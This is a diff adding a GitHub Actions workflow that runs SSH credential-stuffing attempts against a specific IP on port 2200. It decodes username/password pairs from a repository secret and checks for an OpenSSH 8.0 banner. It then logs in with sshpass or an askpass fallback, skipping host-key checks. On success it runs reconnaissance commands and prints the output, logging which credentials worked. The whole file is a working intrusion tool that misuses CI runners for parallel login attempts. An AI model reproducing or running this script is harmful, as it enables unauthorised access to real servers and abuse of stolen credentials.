@@ -1,0 +1,79 @@
+name: probe2200e
+on:
+  workflow_dispatch:
+    inputs:
+      idxs:
+        description: 'json array of pair indexes'
+        required: true
+      tag:
+        description: 'batch tag'
+        required: true
+permissions:
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 8
+    strategy:
+      fail-fast: false
+      max-parallel: 10
+      matrix:
+        idx: ${{ fromJson(github.event.inputs.idxs) }}
+    env:
+      PAIRS_B64: ${{ secrets.PAIRS_B64 }}
+      IDX: ${{ matrix.idx }}
+      TAG: ${{ github.event.inputs.tag }}
+    steps:
+      - name: probe
+        run: |
+          set -u
+          set +e
+          python3 -c "import json,os,base64,hashlib;d=json.loads(base64.b64decode(os.environ['PAIRS_B64']));i=int(os.environ['IDX']);r=[x for x in d if int(x['i'])==i][0];open('u.txt','w').write(r['u']);open('p.txt','w').write(r['p']);open('pwr.txt','w').write(hashlib.sha1(r['p'].encode()).hexdigest()[:16])"
+          U=$(cat u.txt 2>/dev/null); P=$(cat p.txt 2>/dev/null)
+          S=$(date +%s)
+          IP=$(curl -s --max-time 10 https://api.ipify.org 2>/dev/null || echo ERR)
+          python3 - <<'PY' > banner.txt 2>/dev/null
+          import socket
+          try:
+              s = socket.create_connection(('170.249.218.92', 2200), timeout=6)
+              s.settimeout(5)
+              b = s.recv(64).decode('latin-1', 'replace').strip()
+              s.close()
+              print(b)
+          except Exception as e:
+              print('ERR:' + type(e).__name__)
+          PY
+          BANNER=$(head -c 80 banner.txt 2>/dev/null | tr -d '\r\n')
+          BOK=no
+          case "$BANNER" in SSH-2.0-OpenSSH_8.0*) BOK=yes;; esac
+          ARET=-1; ASIG=not_attempted; ALEN=0; BRAND=no; AOUT=""; AERR=""
+          if [ "$BOK" = "yes" ]; then
+            if ! command -v sshpass >/dev/null 2>&1; then
+              sudo apt-get update -qq >/dev/null 2>&1
+              sudo apt-get install -y -qq sshpass >/dev/null 2>&1
+            fi
+            if command -v sshpass >/dev/null 2>&1; then
+              timeout 30 sshpass -p "$P" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o GlobalKnownHostsFile=/dev/null -o LogLevel=ERROR -o ConnectTimeout=8 -o PreferredAuthentications=password -o PubkeyAuthentication=no -o NumberOfPasswordPrompts=1 -p 2200 "$U@170.249.218.92" 'id; uname -a; hostname; ls ~' > asout.txt 2> aserr.txt < /dev/null
+              ARET=$?
+            else
+              printf '#!/bin/sh\necho "$SSHPASS"\n' > /tmp/ap.sh; chmod +x /tmp/ap.sh
+              export SSHPASS="$P" SSH_ASKPASS=/tmp/ap.sh SSH_ASKPASS_REQUIRE=force DISPLAY=:0
+              timeout 30 setsid ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o GlobalKnownHostsFile=/dev/null -o LogLevel=ERROR -o ConnectTimeout=8 -o PreferredAuthentications=password -o PubkeyAuthentication=no -o NumberOfPasswordPrompts=1 -p 2200 "$U@170.249.218.92" 'id; uname -a; hostname; ls ~' > asout.txt 2> aserr.txt < /dev/null
+              ARET=$?
+            fi
+            if [ -s asout.txt ]; then ALEN=$(wc -c < asout.txt); AOUT=$(head -c 300 asout.txt | tr -d '\r\n'); fi
+            AERR=$(head -c 220 aserr.txt 2>/dev/null | tr -d '\r\n"')
+            if [ "$ARET" = "0" ] && echo "$AOUT" | grep -q 'uid='; then ASIG=auth_success
+            elif echo "$AERR" | grep -qi 'currently not available'; then ASIG=nologin
+            elif echo "$AERR" | grep -qiE 'Permission denied|Authentication failed'; then ASIG=invalid_login
+            elif echo "$AERR" | grep -qi 'Connection closed by authenticating user'; then ASIG=closed_by_auth
+            elif echo "$AERR" | grep -qiE 'Connection reset|Connection refused|Connection closed|Connection timed out|No route to host|kex_exchange|banner|Broken pipe'; then ASIG=conn_err
+            elif [ "$ARET" = "124" ] || [ "$ARET" = "137" ]; then ASIG=timeout
+            else ASIG=undecidable
+            fi
+            if echo "$AOUT" | grep -qiE 'rsorder|rsgoldfast|p2pah|pso2ah|xxcase|wwmmoep|mmoexp|overpower3d|armorybids'; then BRAND=yes; ASIG=brand_oos; fi
+          fi
+          E=$(( $(date +%s) - S ))
+          printf 'RESULTJSON {"i":%s,"tag":"%s","pwr":"%s","ip":"%s","banner":"%s","banner_ok":"%s","auth_ret":%s,"sig":"%s","out_len":%s,"brand":"%s","elapsed":%s,"err":"%s"}\n' "$IDX" "$TAG" "$(cat pwr.txt 2>/dev/null)" "$IP" "$BANNER" "$BOK" "$ARET" "$ASIG" "$ALEN" "$BRAND" "$E" "$AERR"
+          if [ "$ASIG" = "auth_success" ]; then echo "HITOUT"; head -c 600 asout.txt; fi
+          exit 0
